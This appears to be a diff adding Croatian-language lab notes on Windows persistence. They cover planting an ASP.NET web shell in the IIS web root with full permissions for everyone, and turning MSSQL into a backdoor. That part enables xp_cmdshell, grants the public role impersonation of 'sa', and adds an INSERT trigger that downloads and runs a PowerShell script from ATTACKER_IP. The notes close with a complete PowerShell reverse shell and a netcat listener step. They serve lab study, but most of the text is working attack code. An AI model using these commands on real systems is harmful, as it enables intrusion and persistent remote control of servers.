@@ -1,0 +1,74 @@
+Using Web Shells
+Ako zelimo izbjeci koristenje windows servisa, mozemo exploitati aplikacije i web servise na racunalu.
+Trebamo uploadati web shell u web direktoriji za web server i ako ga uploadamo on ce nam dati koristenje korisnika iis apppool\defaultapppool.
+Iako nije admin korisnik ima pristup naredbi SeImpersonatePrivilege preko koje jako lagano mozemo povecati svoje ovlasti.
+Kako bi zapoceli instaliramo ASP.NET web shell na sustav (datoteka u folderu)
+Kada ju instaliramo micemo ju u C:\inetpub\wwwroot direktoriji.
+
+move shell.aspx C:\inetpub\wwwroot\
+
+Za svaki slucaj dodajemo sva prava datoteci preko:
+
+icacls shell.aspx /grant Everyone:F
+
+Sada mozemo pristupiti web shellu preko:
+<IP adresa racunala>/shell.aspx
+
+
+MSSQL kao backdoor
+Ovaj exploit ovisi o tome ima li korisnik MSSQL instalaciju.
+Korisitit cemo triggere kako bi mogli izvrsiti neku naredbu kada korisnik izvrsi neki query, poput dodavanja korisnika ili brisanja.
+Prije nego sto pocnemo moramo omoguciti `xp_cmdshell` stored proceduru.
+(za ovaj labos koristimo kredencijale trenutnog korisnika)
+Kako bi ju omogucili moramo otvoriti novi query i izvrsiti ove naredbe:
+
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+
+Nakon sto smo to izvrsili trebamo osigurati da svaka web stranica koja pristupa bazi moze izvrsavati xp_cmdshell. 
+Po defaultu samo database korisnici sa sysadmin roleom mogu izvrsavati xp_cmdshell.
+Web aplikacije po defaultu koriste restriktiranog korisnika, tako da trebamo nekako impersionirati administratora preko:
+
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+
+Na samome kraju mjenjamo se u bazu preko koje izvrsavamo exploit:
+
+USE HRDB
+
+Sada trebamo dodati triggeru u bazu koji ce se izvrsiti kada korisnik nesto doda u bazu:
+
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+
+Na samome kraju pisemo exploit na nasem racunalu koji ce zrtva dohvacati:
+
+`
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+`
+
+Sada sve sto je potrebno je da pokrenemo nc za slucanje i web server da moze dohvatiti paket
+(pristupamo web interfaceu preko http://IP/)
